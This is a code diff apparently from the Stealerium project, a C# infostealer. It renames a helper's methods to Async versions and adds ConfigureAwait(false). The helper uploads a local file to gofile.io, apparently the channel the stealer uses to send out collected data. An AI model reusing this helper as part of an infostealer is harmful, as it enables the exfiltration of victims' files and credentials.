@@ -14,20 +14,20 @@ namespace Stealerium.Helpers
     {
         private const string ServiceEndpoint = "https://{server}.gofile.io/";
 
-        public static async Task<string> UploadFile(string file)
+        public static async Task<string> UploadFileAsync(string file)
         {
             using (var client = new HttpClient())
             {
-                var optimalServer = GetServer(client);
-                var endpoint = ServiceEndpoint.Replace("{server}", await optimalServer);
+                var optimalServer = GetServerAsync(client);
+                var endpoint = ServiceEndpoint.Replace("{server}", await optimalServer.ConfigureAwait(false));
 
                 var content = new MultipartFormDataContent
                 {
                     { new StreamContent(File.OpenRead(file)), "file", Path.GetFileName(file) }
                 };
 
-                var response = await client.PostAsync(endpoint + "uploadFile", content);
-                var responseBody = await response.Content.ReadAsStringAsync();
+                var response = await client.PostAsync(endpoint + "uploadFile", content).ConfigureAwait(false);
+                var responseBody = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
                 var rawJson = JObject.Parse(responseBody);
                 var d = JsonConvert.SerializeObject(rawJson);
                 var output = JsonConvert.DeserializeObject<ApiResponse>(d);
@@ -36,9 +36,9 @@ namespace Stealerium.Helpers
             }
         }
 
-        private static async Task<string> GetServer(HttpClient client)
+        private static async Task<string> GetServerAsync(HttpClient client)
         {
-            var request = await client.GetStringAsync(ServiceEndpoint.Replace("{server}", "apiv2") + "getServer");
+            var request = await client.GetStringAsync(ServiceEndpoint.Replace("{server}", "apiv2") + "getServer").ConfigureAwait(false);
             var output = JObject.Parse(request);
             var d = JsonConvert.SerializeObject(output);
             var serverStatus = JsonConvert.DeserializeObject<ApiResponse>(d);
